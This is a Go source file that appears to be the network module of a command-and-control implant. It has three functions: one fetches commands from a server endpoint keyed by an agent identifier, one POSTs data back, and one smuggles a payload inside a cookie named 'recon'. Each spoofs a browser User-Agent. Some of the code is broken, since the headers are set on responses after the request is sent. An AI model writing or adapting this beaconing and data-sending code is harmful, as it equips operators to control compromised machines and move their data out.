package method

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"net/url"
	"strings"
	"time"
)

type Client struct {
	HTTP *http.Client
}

func ConfigClient() *http.Client {
	transport := &http.Transport{

		TLSHandshakeTimeout: 10 * time.Second,
		Dial: (&net.Dialer{
			Timeout: 10 * time.Second,
		}).Dial,
	}
	client := &http.Client{
		Transport: transport,
		Timeout:   30 * time.Minute, // The client tries to reconnect anyways...
	}

	return client

}

func DownloadString(client *http.Client, uri string, ag string) string {
	resp, err := client.Get(uri + ag)
	if err != nil {
		fmt.Printf("[-] Got error when requesting cmd: %s", err)
	}
	userAGent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 `
	resp.Header.Set("User-Agent", userAGent)

	defer resp.Body.Close()

	fileContents, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err)
	}

	aa := string(fileContents)
	return aa
}
func Sendata(client *http.Client, endpoint string, agente string, paylaod string) string {

	data := url.Values{}
	data.Set("data", paylaod)
	req, err := client.Post(endpoint+agente, "application/x-www-form-urlencoded", bytes.NewBuffer([]byte(data.Encode())))
	//	req, err := http.NewRequest("POST", endpoint+agente, strings.NewReader(data.Encode())) // URL-encoded payload

	//req.SetBasicAuth(Username, Password)
	userAGent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 `
	req.Header.Set("User-Agent", userAGent)
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	//res, err := client.Do(req)
	//if err != nil {
	//	log.Fatal(err)
	//}

	defer req.Body.Close()
	body, err := ioutil.ReadAll(req.Body)
	if err != nil {
		log.Fatal(err)
	}
	result := string(body)
	return result
}

func SendCook(endpoint string, agente string, payload string) string {
	data := url.Values{}
	//data.Set("data", payload)
	client := ConfigClient()
	req, err := http.NewRequest("POST", endpoint+agente, strings.NewReader(data.Encode())) // URL-encoded payload
	if err != nil {
		log.Fatal(err)
	}
	//req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	cookie := &http.Cookie{
		Name:     "recon",
		Value:    payload,
		MaxAge:   0,
		HttpOnly: true,
	}
	//req.SetBasicAuth(Username, Password)
	userAGent := `Mozilla/5.0 (Windows NT; Windows NT 6.1; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 `
	req.Header.Set("User-Agent", userAGent)
	req.AddCookie(cookie)

	res, err := client.Do(req)
	if err != nil {
		log.Fatal(err)
	}

	defer res.Body.Close()
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatal(err)
	}
	result := string(body)
	return result
}
